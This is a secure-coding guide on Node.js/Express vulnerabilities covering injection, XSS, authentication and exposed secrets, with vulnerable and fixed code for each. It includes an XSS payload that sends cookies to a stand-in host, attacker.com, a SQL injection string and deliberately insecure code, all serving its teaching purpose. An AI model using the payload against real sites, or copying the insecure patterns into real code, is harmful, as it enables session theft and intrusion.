# Top 10 Node.js/Express Security Vulnerabilities & Best Practices

## 1. SQL/NoSQL Injection

### Vulnerability Description
Attackers inject malicious code through input fields, allowing unauthorized database access or data manipulation.

### Examples

**Vulnerable Code:**
```javascript
// SQL Injection
const query = "SELECT * FROM users WHERE username = '" + username + "'";
db.query(query, (err, results) => { ... });

// NoSQL Injection
User.find({ username: req.body.username }, (err, user) => { ... });
```

**Attack Example:**
```
Username: admin' --
Password: anything
// Results in: SELECT * FROM users WHERE username = 'admin' --'
```

### Mitigation Strategies

**1. Use Parameterized Queries:**
```javascript
// SQL - Using prepared statements
const query = "SELECT * FROM users WHERE username = ? AND password = ?";
db.query(query, [username, password], (err, results) => { ... });

// Using async/await with connection pool
const connection = await pool.getConnection();
const results = await connection.query('SELECT * FROM users WHERE id = ?', [userId]);
```

**2. Use ORM/ODM Libraries:**
```javascript
// Mongoose (NoSQL protection)
User.findOne({ username: sanitizeInput(username) });

// Sequelize (SQL ORM)
User.findOne({
  where: { username: username }
});
```

**3. Input Validation:**
```javascript
const { body, validationResult } = require('express-validator');

app.post('/login', [
  body('username').isAlphanumeric().trim(),
  body('password').isLength({ min: 8 })
], (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }
  // Process safe input
});
```

---

## 2. Cross-Site Scripting (XSS)

### Vulnerability Description
Attackers inject malicious scripts that execute in users' browsers, stealing session tokens, cookies, or sensitive data.

### Examples

**Vulnerable Code:**
```javascript
// Reflected XSS
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Results for: ${query}</h1>`); // Unsanitized output
});

// Stored XSS
app.post('/comment', (req, res) => {
  const comment = req.body.text;
  db.save({ comment: comment }); // No sanitization
  res.send(`<p>${comment}</p>`); // Rendered without escaping
});
```

**Attack Example:**
```
URL: /search?q=<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

### Mitigation Strategies

**1. Use Template Engines with Auto-Escaping:**
```javascript
// Using EJS with auto-escaping (enabled by default)
app.set('view engine', 'ejs');

// Template file
<div><%= userComment %></div> <!-- Automatically escaped -->
```

**2. HTML Entity Encoding:**
```javascript
const xss = require('xss');
const DOMPurify = require('isomorphic-dompurify');

app.get('/search', (req, res) => {
  const query = xss(req.query.q); // Sanitize input
  res.render('results', { query: query });
});

// Or use DOMPurify
const clean = DOMPurify.sanitize(userInput);
```

**3. Content Security Policy (CSP):**
```javascript
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "trusted-cdn.com"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
  },
}));
```

**4. HTTPOnly and Secure Cookies:**
```javascript
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: true,
  cookie: {
    httpOnly: true,     // Prevents JavaScript access
    secure: true,       // Only sent over HTTPS
    sameSite: 'strict'  // CSRF protection
  }
}));
```

---

## 3. Authentication & Authorization Vulnerabilities

### Vulnerability Description
Weak authentication mechanisms or improper authorization checks allow attackers to impersonate users or access unauthorized resources.

### Examples

**Vulnerable Code:**
```javascript
// No password hashing
app.post('/register', (req, res) => {
  const user = {
    username: req.body.username,
    password: req.body.password // Stored in plaintext!
  };
  db.save(user);
});

// Missing authorization check
app.get('/user/:id/profile', (req, res) => {
  const profile = db.findUser(req.params.id);
  res.json(profile); // Anyone can access any profile!
});

// Weak JWT validation
const token = req.headers.authorization.split(' ')[1];
const decoded = jwt.decode(token); // No verification!
```

### Mitigation Strategies

**1. Password Hashing:**
```javascript
const bcrypt = require('bcrypt');

// Registration
app.post('/register', async (req, res) => {
  const hashedPassword = await bcrypt.hash(req.body.password, 10);
  const user = {
    username: req.body.username,
    password: hashedPassword
  };
  await db.save(user);
  res.status(201).json({ message: 'User created' });
});

// Login
app.post('/login', async (req, res) => {
  const user = await db.findOne({ username: req.body.username });
  const passwordMatch = await bcrypt.compare(req.body.password, user.password);
  if (passwordMatch) {
    // Generate token
  }
});
```

**2. JWT with Proper Validation:**
```javascript
const jwt = require('jsonwebtoken');

// Generate token
const token = jwt.sign(
  { userId: user.id, role: user.role },
  process.env.JWT_SECRET,
  { expiresIn: '1h', algorithm: 'HS256' }
);

// Verify token
const verifyToken = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token' });

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    res.status(403).json({ error: 'Invalid token' });
  }
};

app.get('/protected', verifyToken, (req, res) => {
  res.json({ data: 'protected' });
});
```

**3. Role-Based Access Control (RBAC):**
```javascript
const checkRole = (allowedRoles) => {
  return (req, res, next) => {
    if (!allowedRoles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    next();
  };
};

app.delete('/user/:id', verifyToken, checkRole(['admin']), (req, res) => {
  // Only admins can delete users
  db.delete(req.params.id);
  res.json({ message: 'User deleted' });
});
```

**4. Multi-Factor Authentication (MFA):**
```javascript
const speakeasy = require('speakeasy');
const qrcode = require('qrcode');

// Setup 2FA
app.post('/setup-2fa', verifyToken, async (req, res) => {
  const secret = speakeasy.generateSecret({ 
    name: `App (${req.user.email})` 
  });
  const qr = await qrcode.toDataURL(secret.otpauth_url);
  res.json({ qr, secret: secret.base32 });
});

// Verify 2FA
const verifyOTP = (secret, token) => {
  return speakeasy.totp.verify({
    secret: secret,
    encoding: 'base32',
    token: token,
    window: 2
  });
};
```

---

## 4. Exposed Secrets & Configuration

### Vulnerability Description
API keys, database credentials, and other secrets are hardcoded or stored insecurely, allowing attackers to compromise systems.

### Examples

**Vulnerable Code:**
```javascript
// Hardcoded secrets
const API_KEY = 'sk_live_abc123xyz789';
const DB_PASSWORD = 'admin123';

// Secrets in version control
app.use(passport.initialize());
passport.use(new TwitterStrategy({
  consumerKey: 'YOUR_CONSUMER_KEY_HERE',
  consumerSecret: 'YOUR_CONSUMER_SECRET_HERE'
}, ...));

// Secrets in logs
console.log('Database connected:', dbPassword);
```

### Mitigation Strategies

**1. Environment Variables (.env file):**
```javascript
require('dotenv').config();

const dbPassword = process.env.DB_PASSWORD;
const apiKey = process.env.API_KEY;
const jwtSecret = process.env.JWT_SECRET;

if (!apiKey || !dbPassword) {
  throw new Error('Missing required environment variables');
}
```

**.env file:**
```
DB_HOST=localhost
DB_USER=admin
DB_PASSWORD=securePassword123
API_KEY=sk_live_abc123xyz789
JWT_SECRET=your_very_long_random_secret_key
NODE_ENV=production
```

**.gitignore:**
```
.env
.env.local
.env.*.local
*.key
*.pem
node_modules/
```

**2. Secret Management Service:**
```javascript
// Using AWS Secrets Manager
const AWS = require('aws-sdk');
const secretsManager = new AWS.SecretsManager();

async function getSecret() {
  try {
    const data = await secretsManager.getSecretValue({
      SecretId: 'prod/db-password'
    }).promise();
    return JSON.parse(data.SecretString);
  } catch (err) {
    console.error('Failed to retrieve secret');
    throw err;
  }
}
```

**3. Secure Logging:**
```javascript
// Mask sensitive data
const maskSensitive = (obj) => {
  const masked = { ...obj };
  if (masked.password) masked.password = '***';
  if (masked.apiKey) masked.apiKey = '***';
  if (masked.creditCard) masked.creditCard = 'xxxx-xxxx-xxxx-' + masked.creditCard.slice(-4);
  return masked;
};

app.post('/login', (req, res) => {
  console.log('Login attempt:', maskSensitive(req.body));
  // ...
});
```

**4. Secrets Scanning in CI/CD:**
```bash
# Using git-secrets or truffleHog
git secrets --scan

# Using npm audit
npm audit

# Using Snyk
snyk test
```

